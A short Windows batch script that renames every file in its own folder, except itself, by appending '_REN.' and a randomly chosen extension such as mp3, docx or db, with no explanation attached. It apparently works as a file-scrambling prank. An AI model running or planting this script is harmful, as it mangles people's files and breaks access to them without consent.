@echo off&setlocal enabledelayedexpansion
cd /d %~dp0
set a0=mp3
set a1=doc
set a2=docx
set a3=epub
set a4=txt
set a5=ppt
set a6=pptx
set a7=ttf
set a8=lua
set a9=xls
set a10=osk
set a11=osz
set a12=db
set a13=xlsx
set a14=flac
echo %cd%
for /f %%a in ('dir /b') do call :ax %%~a %~nx0
pause
exit /b
:ax
set /a r=!random!%%15
echo %~1  %~2
if not "%~1"=="" if not "%~1"=="%~2" ren %~1 %~1_REN.!a%r%!
goto :eof
